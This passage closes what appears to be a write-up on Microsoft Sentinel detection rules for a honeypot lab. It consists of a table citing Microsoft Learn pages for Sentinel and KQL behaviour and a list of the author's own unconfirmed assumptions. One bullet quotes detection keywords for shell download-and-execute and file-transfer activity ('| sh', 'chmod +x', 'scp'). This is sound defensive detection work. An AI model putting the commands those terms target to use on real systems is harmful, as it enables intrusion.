| Scheduled rules: frequency and lookback 5 min–14 days; frequency ≤ lookback; built-in five-minute delay; the first run is immediate on creation; the threshold applies per run; event grouping modes; 150 alerts per run; suppression stops the rule for up to 24 h; alert grouping 5 min–7 days (default 5 h); 150 alerts per incident; severity definitions; dynamic alert details; ASIM recommended; a 10,000-character query limit; `column_ifexists`; Azure portal retirement after March 31, 2027 | https://learn.microsoft.com/en-us/azure/sentinel/scheduled-rules-overview |
| The ingestion-delay pattern (extend lookback, deduplicate with `ingestion_time()`); Defender XDR custom detections recommended for new rules | https://learn.microsoft.com/en-us/azure/sentinel/ingestion-delay |
| NRT: runs every minute; captures events ingested in the preceding minute; 2-minute delay; 50 rules; 30 single-event alerts | https://learn.microsoft.com/en-us/azure/sentinel/near-real-time-rules |
| Entity mapping: up to 10 mappings, 3 identifiers each, 500 entities per alert | https://learn.microsoft.com/en-us/azure/sentinel/map-data-fields-to-entities |
| Account entities named ADMIN, ADMINISTRATOR, ROOT, SYSTEM and similar are dropped; IP Address is a strong identifier for global addresses; Host and FileHash identifiers | https://learn.microsoft.com/en-us/azure/sentinel/entities-reference |
| `bin()` rounds down to a multiple of the bin size | https://learn.microsoft.com/en-us/kusto/query/bin-function |
| `join`: the default `innerunique` deduplicates the left side; `inner` keeps all matches; put the smaller table on the left | https://learn.microsoft.com/en-us/kusto/query/join-operator |
| `has` is term-based (maximal alphanumeric runs) and case-insensitive; the term index needs 3 or more characters; `has` is faster than `contains` | https://learn.microsoft.com/en-us/kusto/query/datatypes-string-operators ; https://learn.microsoft.com/en-us/kusto/query/has-operator |
| `has_any`: same term semantics; index optimization is disabled above 128 terms | https://learn.microsoft.com/en-us/kusto/query/has-any-operator |
| `dcount()` is a HyperLogLog estimate, exact at small cardinality (up to 1,000 values at accuracy 1) | https://learn.microsoft.com/en-us/kusto/query/dcount-aggregation-function |
| Integer / integer truncates | https://learn.microsoft.com/en-us/kusto/query/numerical-operators |
| timespan / timespan returns a real; datetime arithmetic | https://learn.microsoft.com/en-us/kusto/query/scalar-data-types/timespan ; https://learn.microsoft.com/en-us/kusto/query/datetime-timespan-arithmetic |
| `make-series`: binned with `bin_at` anchored at `from`; `default` value; `to` is exclusive; `dcountif` is listed | https://learn.microsoft.com/en-us/kusto/query/make-series-operator |
| `series_fir`: `normalize` defaults to true for non-negative filters; `center=false` gives a trailing window | https://learn.microsoft.com/en-us/kusto/query/series-fir-function |
| `series_stats_dynamic` returns `max` (and other statistics) | https://learn.microsoft.com/en-us/kusto/query/series-stats-dynamic-function |
| `matches regex` is case-sensitive, with at most 16 groups; regex syntax covers `(?i)`, `\b`, non-capturing groups and `&&` class intersection | https://learn.microsoft.com/en-us/kusto/query/matches-regex-operator ; https://learn.microsoft.com/en-us/kusto/query/regex |
| `ago()` and `now()` use one reference time per statement | https://learn.microsoft.com/en-us/kusto/query/ago-function ; https://learn.microsoft.com/en-us/kusto/query/now-function |
| `max_of()` requires arguments of the same type | https://learn.microsoft.com/en-us/kusto/query/max-of-function |
| `in` and `!in` are case-sensitive; a tabular argument uses its first column | https://learn.microsoft.com/en-us/kusto/query/in-cs-operator ; https://learn.microsoft.com/en-us/kusto/query/not-in-cs-operator |
| Best practices: datetime filters first; `has` over `contains`; smaller table on the left; `materialize()` for a reused `let`; `in` instead of a semi-join | https://learn.microsoft.com/en-us/kusto/query/best-practices |
| `summarize`: explicit bins required; a summarize with no keys returns one row; `max()` defaults to null | https://learn.microsoft.com/en-us/kusto/query/summarize-operator |
| `countif`, `make_set` (and flattening of array inputs), `make_set_if`, `make_list_if`, `set_has_element`, `between` (datetime expressions), `indexof` (case-sensitive, -1 when not found), `ingestion_time()` | https://learn.microsoft.com/en-us/kusto/query/countif-aggregation-function ; https://learn.microsoft.com/en-us/kusto/query/make-set-aggregation-function ; https://learn.microsoft.com/en-us/kusto/query/make-set-if-aggregation-function ; https://learn.microsoft.com/en-us/kusto/query/make-list-if-aggregation-function ; https://learn.microsoft.com/en-us/kusto/query/set-has-element-function ; https://learn.microsoft.com/en-us/kusto/query/between-operator ; https://learn.microsoft.com/en-us/kusto/query/indexof-function ; https://learn.microsoft.com/en-us/kusto/query/ingestion-time-function |
| Syslog columns `Facility`, `ProcessName`, `SyslogMessage`, `Computer` | https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/syslog |
| AMA JSON logs: `TimeGenerated` is the ingestion time unless a transformation sets it; `Computer` and `FilePath` are filled only if the table defines them | https://learn.microsoft.com/en-us/azure/azure-monitor/vm/data-collection-log-json |
| Syslog DCR facilities and minimum log levels | https://learn.microsoft.com/en-us/azure/sentinel/connect-cef-syslog-ama |
| ASIM authentication: `imAuthentication`; Windows (4624/4625) and Linux sshd parsers exist | https://learn.microsoft.com/en-us/azure/sentinel/normalization-schema-authentication ; https://learn.microsoft.com/en-us/azure/sentinel/normalization-parsers-list |
| NSG flow logs: no new creation; retiring September 30, 2027; migrate to VNet flow logs | https://learn.microsoft.com/en-us/azure/network-watcher/nsg-flow-logs-overview |

### My judgment (not confirmed by Microsoft docs)

- **The arithmetic of the bin-split and phase-band bugs** (the 2–4/min band, for example). It follows from the documented `bin()` semantics plus an arbitrary rule phase. Learn doesn't say whether Sentinel anchors the lookback window to the scheduled time or to the delayed execution time. That affects the exact numbers, not whether the gap exists.
- **How the built-in five-minute delay interacts with an in-query `ago()`.** Not documented. That is why the revised rules keep explicit margins, such as `Frequency + 10m`, and rely on alert grouping for duplicates.
- **`Account` = `TargetDomainName\TargetUserName`** for logon events.
- **NLA failures logged with `-` as the source, and RdpCoreTS event 140 carrying the IP.** Community knowledge, not in Learn.
- **4624 `ANONYMOUS LOGON` from SMB null sessions** because the host firewall is off. I assume the NSG is wide open, as in the tutorial this lab is based on; the README doesn't say.
- **How `has` and `has_any` match values that are only punctuation or contain several terms** (`./`, `| sh`, `chmod +x`, `scp `). Not specified in the pages I fetched.
- **`dcount()` over a datetime expression.** The parameter table says `string`; I treat it as valid by analogy with `make_set`'s own example.
- **Cowrie behavior:** one `cowrie.command.input` per line, the `cowrie.login.*` and `cowrie.client.version` event IDs, and message formats. These are Cowrie knowledge plus what the hunting queries imply. Check with `Cowrie_CL | distinct eventid` and sample rows.
- **OpenSSH 9.8+ logging as `sshd-session`.**
- **All MITRE ATT&CK technique IDs, names and mappings.** These come from ATT&CK, not Microsoft Learn.
- **Every threshold, severity, frequency and lookback recommendation,** and every honeypot-vs-production false-positive assessment.
- **The `NTANetAnalytics` table name.** Sourced from a Microsoft Q&A answer; I didn't fetch the table reference page.

[tbl-se]: https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/securityevent
[ev4625]: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4625
[logontypes]: https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types
[evsets]: https://learn.microsoft.com/en-us/azure/sentinel/windows-security-event-id-reference
[sched]: https://learn.microsoft.com/en-us/azure/sentinel/scheduled-rules-overview
[ingest]: https://learn.microsoft.com/en-us/azure/sentinel/ingestion-delay
[nrt]: https://learn.microsoft.com/en-us/azure/sentinel/near-real-time-rules
[entref]: https://learn.microsoft.com/en-us/azure/sentinel/entities-reference
[bin]: https://learn.microsoft.com/en-us/kusto/query/bin-function
[join]: https://learn.microsoft.com/en-us/kusto/query/join-operator
[strops]: https://learn.microsoft.com/en-us/kusto/query/datatypes-string-operators
[hasany]: https://learn.microsoft.com/en-us/kusto/query/has-any-operator
[dcount]: https://learn.microsoft.com/en-us/kusto/query/dcount-aggregation-function
[numops]: https://learn.microsoft.com/en-us/kusto/query/numerical-operators
[ts]: https://learn.microsoft.com/en-us/kusto/query/scalar-data-types/timespan
[dtarith]: https://learn.microsoft.com/en-us/kusto/query/datetime-timespan-arithmetic
[mkseries]: https://learn.microsoft.com/en-us/kusto/query/make-series-operator
[fir]: https://learn.microsoft.com/en-us/kusto/query/series-fir-function
[sstats]: https://learn.microsoft.com/en-us/kusto/query/series-stats-dynamic-function
[mregex]: https://learn.microsoft.com/en-us/kusto/query/matches-regex-operator
[regex]: https://learn.microsoft.com/en-us/kusto/query/regex
[ago]: https://learn.microsoft.com/en-us/kusto/query/ago-function
[now]: https://learn.microsoft.com/en-us/kusto/query/now-function
[maxof]: https://learn.microsoft.com/en-us/kusto/query/max-of-function
[incs]: https://learn.microsoft.com/en-us/kusto/query/in-cs-operator
[notin]: https://learn.microsoft.com/en-us/kusto/query/not-in-cs-operator
[bp]: https://learn.microsoft.com/en-us/kusto/query/best-practices
[summ]: https://learn.microsoft.com/en-us/kusto/query/summarize-operator
[countif]: https://learn.microsoft.com/en-us/kusto/query/countif-aggregation-function
[mkset]: https://learn.microsoft.com/en-us/kusto/query/make-set-aggregation-function
[mksetif]: https://learn.microsoft.com/en-us/kusto/query/make-set-if-aggregation-function
[mklistif]: https://learn.microsoft.com/en-us/kusto/query/make-list-if-aggregation-function
[sethas]: https://learn.microsoft.com/en-us/kusto/query/set-has-element-function
[between]: https://learn.microsoft.com/en-us/kusto/query/between-operator
[indexof]: https://learn.microsoft.com/en-us/kusto/query/indexof-function
[amajson]: https://learn.microsoft.com/en-us/azure/azure-monitor/vm/data-collection-log-json
[syslogama]: https://learn.microsoft.com/en-us/azure/sentinel/connect-cef-syslog-ama
[nsgfl]: https://learn.microsoft.com/en-us/azure/network-watcher/nsg-flow-logs-overview
